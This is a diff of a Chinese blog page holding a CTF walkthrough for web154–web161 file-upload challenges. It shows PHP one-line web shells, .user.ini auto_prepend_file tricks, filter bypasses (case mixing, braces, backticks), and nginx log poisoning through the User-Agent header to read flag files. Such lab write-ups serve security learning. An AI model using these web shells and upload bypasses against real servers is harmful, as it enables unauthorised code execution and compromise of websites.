@@ -35,7 +35,7 @@
 <meta property="og:image" content="http://example.com/images/0XC3.png">
 <meta property="og:image" content="http://example.com/images/KAO6J.png">
 <meta property="article:published_time" content="2023-05-24T16:00:00.000Z">
-<meta property="article:modified_time" content="2023-05-25T14:22:39.934Z">
+<meta property="article:modified_time" content="2023-09-07T13:59:33.839Z">
 <meta property="article:author" content="奇怪的奇怪">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://example.com/images/Y8.png">
@@ -248,7 +248,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.1k 字
+          2.2k 字
         
       </span>
     
@@ -259,7 +259,7 @@
         
         
         
-          18 分钟
+          19 分钟
         
       </span>
     
@@ -323,20 +323,20 @@
 
 <p>查看源码发现flag</p>
 <h2 id="web154"><a href="#web154" class="headerlink" title="web154"></a>web154</h2><p>首先写好一个.user.ini文件<br>内容为auto_prepend_file&#x3D;1.pHp<br><strong>注：本题过滤了php，因此使用大小写混写可以跳过</strong><br>把.user.ini文件添加png后缀以成功提交<br>在提交时开启burpsuite 抓包<br><img src="/images/6CQ02C.png" srcset="/img/loading.gif" lazyload><br>删除.png后缀<br><img src="/images/OHK.png" srcset="/img/loading.gif" lazyload><br>成功提交<br>再写一个1.pHp文件<br>内容为<?pHp eval($_POST['a']);?><br>同样的php要大小写混用<br>把1.pHp后缀改为1.png<br>上传，抓包，把后缀.png改为.pHp<br><img src="/images/0XC3.png" srcset="/img/loading.gif" lazyload><br>成功上传<br>接下来我们打开中国蚁剑<br><img src="/images/KAO6J.png" srcset="/img/loading.gif" lazyload><br>成功连接<br>在&#x2F;var&#x2F;www&#x2F;html&#x2F;中找到flag.php<br>✌️</p>
-<h2 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h2><p>先上传.user.ini.png文件<br>内容为auto_prepend_file&#x3D;1.png<br><strong>注：本题过滤了php</strong><br>提交时开启burpsuite 抓包<br>删除.png后缀<br>成功提交<br>再写一个1.png文件<br>内容为<?= eval($POST['a']);?><br>直接提交<br>这样写虽然能成功连接中国蚁剑但是不能访问，所以<br>进入&#x2F;upload&#x2F;index.php路径<br>hackbar中post提交a&#x3D;system(“cat ..&#x2F;flag.php”);<br>打开源码即可看到flag</p>
+<h2 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h2><p>先上传.user.ini.png文件<br>内容为auto_prepend_file&#x3D;1.png<br><strong>注：本题过滤了php</strong><br>提交时开启burpsuite 抓包<br>删除.png后缀<br>成功提交<br>再写一个1.png文件<br>内容为<code>&lt;?= eval($POST[&#39;a&#39;]);?&gt;</code><br>直接提交<br>这样写虽然能成功连接中国蚁剑但是不能访问，所以<br>进入&#x2F;upload&#x2F;index.php路径<br>hackbar中post提交a&#x3D;system(“cat ..&#x2F;flag.php”);<br>打开源码即可看到flag</p>
 <p>2<br>虽然本题过滤了php，但可以用txt<br>上传.user.ini.png文件<br>内容为auto_prepend_file&#x3D;1.txt<br>抓包，删除.png后缀<br>成功提交<br>写一个1.png文件<br>内容同上<br>抓包将png后缀改为.txt<br>上传成功<br>这样就能在中国蚁剑上访问了<br>同样的flag在&#x2F;var&#x2F;www&#x2F;html&#x2F;目录下</p>
 <h2 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h2><p>上传1.png文件 内容为 <code>&lt;?= eval($_POST&#123;&#39;a&#39;&#125;);?&gt;</code><br>在burpsuite里改为1.txt<br>这题过滤了php还有[]，所以[]用{}代替<br>接下来就和上一题一样了<br>上传一个.user.ini.png<br>内容为auto_prepend_file&#x3D;1.txt<br>抓包后改为.user.ini<br>进入&#x2F;upload&#x2F;index.php 打开蚁剑，成功连接，找到flag<br>也可以在post里输入a&#x3D;system(“cat ..&#x2F;flag.php”);<br>找到flag</p>
-<h2 id="web157"><a href="#web157" class="headerlink" title="web157"></a>web157</h2><p>本题又添加过滤了;<br>我们可以把语句用括号()包含，<br>1.png<br>内容：&#96;&#96;&#96;<?=(system("cat ../fla*"))?></p>
-<p>.user.ini<br>内容：&#96;&#96;&#96;auto_prepend_file&#x3D;1.png</p>
+<h2 id="web157"><a href="#web157" class="headerlink" title="web157"></a>web157</h2><p>本题又添加过滤了;<br>我们可以把语句用括号()包含，<br>1.png<br>内容：<code>&lt;?=(system(&quot;cat ../fla*&quot;))?&gt;</code></p>
+<p>.user.ini<br>内容：<code>auto_prepend_file=1.png</code></p>
 <p>上传这两个后进入&#x2F;upload查看flag</p>
 <h2 id="web158"><a href="#web158" class="headerlink" title="web158"></a>web158</h2><p>同157题</p>
-<h2 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h2><p>本题又过滤了括号，我们可以用反引号代替括号<br>1.png<br>内容：&#96;&#96;&#96;<?= `cat ../fla*`?></p>
-<p>.user.ini<br>内容：&#96;&#96;&#96;auto_prepend_file&#x3D;1.png</p>
+<h2 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h2><p>本题又过滤了括号，我们可以用反引号代替括号<br>1.png<br>内容：<code>&lt;?= `cat ../fla*`?&gt;</code></p>
+<p>.user.ini<br>内容：<code>auto_prepend_file=1.png</code></p>
 <p>上传后进入&#x2F;upload查看flag</p>
 <h2 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h2><p>本题添加了日志包含，nginx的日志在&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log，过滤了log，用.拼接<br>include”&#x2F;var&#x2F;lo”.”g&#x2F;nginx&#x2F;access.lo”.”g”</p>
-<p>首先先上传.user.ini<br>内容：auto_prepend_file&#x3D;1.png</p>
-<p>再上传1.png<br>内容：<?=include"/var/lo"."g/nginx/access.lo"."g"?></p>
-<p>进入&#x2F;uoload 发现日志包含ua头,我们在ua头写cat语句<br>User-Agent:<?=`cat ../fla*`?><br>成功显示flag</p>
+<p>首先先上传.user.ini<br>内容：<code>auto_prepend_file=1.png</code></p>
+<p>再上传1.png<br>内容：<code>&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</code></p>
+<p>进入&#x2F;uoload 发现日志包含ua头,我们在ua头写cat语句<br>User-Agent:<code>&lt;?=`cat ../fla*`?&gt;</code><br>成功显示flag</p>
 <h2 id="web161"><a href="#web161" class="headerlink" title="web161"></a>web161</h2><p>本题较上一题添加了绕过PHP函数getimagesize()检测文件头，老套路，上传的文件首行都加一个GIF89A,其余操作同160题</p>
 
                 
